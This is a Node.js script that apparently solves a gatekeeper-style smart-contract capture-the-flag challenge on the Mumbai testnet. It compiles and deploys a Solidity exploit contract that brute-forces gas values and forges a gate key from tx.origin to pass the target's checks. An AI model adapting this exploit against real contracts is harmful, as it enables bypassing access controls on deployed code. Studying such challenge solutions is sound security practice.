const ethers = require('ethers');
const provider = new ethers.JsonRpcProvider('https://matic-mumbai.chainstacklabs.com');
const solc = require('solc');

const contractAbi = [{"inputs":[{"internalType":"bytes8","name":"_gateKey","type":"bytes8"}],"name":"enter","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function","signature":"0x3370204e"},{"inputs":[],"name":"entrant","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function","constant":true,"signature":"0x9db31d77"}];

const exploitCode = `
    pragma solidity 0.8.19;

    interface IEnter {
        function enter(bytes8 _gateKey) external returns (bool);
    }

    contract Exploit {
        function exploit(address _target) public returns (bool) {
            bytes8 key = bytes8(0x1000000000000000 + uint16(uint160(tx.origin)));
            for (uint i = 0; i < 8191; i++) {
                try IEnter(_target).enter{gas: i + 22000}(key) {
                    return true;
                } catch {
                    continue;
                }
            }

            return false;
        }
    }
`;

const input = {
    language: 'Solidity',
    sources: {
        'Exploit.sol': {
            content: exploitCode,
        },
    },
    settings: {
        outputSelection: {
            '*': {
                '*': ['*'],
            },
        },
    },
};

async function solve(privateKey, contractAddress, contractAbi) {
    const contract = new ethers.Contract(contractAddress, contractAbi, provider);
    const account = new ethers.Wallet(privateKey, provider);

    if (await isSolved(contract, account)) {
        console.log('contract already pwned');
        process.exit(0);
    }

    console.log('compiling exploit contract...');
    const compiler = await (new Promise((resolve, reject) => {
        solc.loadRemoteVersion('v0.8.19+commit.7dd6d404', (err, solc) => {
            if (err) {
                reject(err);
                return;
            }
            resolve(solc);
        });
    }));
    const compilerOutput = JSON.parse(compiler.compile(JSON.stringify(input)));
    console.log(compilerOutput);
    const exploitAbi = compilerOutput.contracts['Exploit.sol'].Exploit.abi;
    const exploitBytecode = compilerOutput.contracts['Exploit.sol'].Exploit.evm.bytecode.object;

    console.log('deploying exploit contract...');

    const factory = new ethers.ContractFactory(exploitAbi, exploitBytecode, account);
    const exploitInstance = await factory.deploy();
    const exploitAddress = await exploitInstance.getAddress();
    console.log('exploit contract deployed at:', exploitAddress);

    console.log('calling exploit function...');
    const exploitTx = await exploitInstance.connect(account).exploit(contractAddress);
    await exploitTx.wait();

    console.log('checking if all gates were passed...');
    if (await isSolved(contract, account)) {
        console.log('solved!');
    } else {
        console.error('failed to exploit contract');
        process.exit(1);
    }
}

async function isSolved(contract, account) {
    return (await contract.entrant()) === account.address;
}

const privateKey = process.argv[2];
if (!privateKey) {
    console.error('private key must be provided as the first argument');
    process.exit(1);
}

const contractAddress = process.argv[3];
if (!contractAddress) {
    console.error('contract address must be provided as the second argument');
    process.exit(1);
}

solve(privateKey, contractAddress, contractAbi);
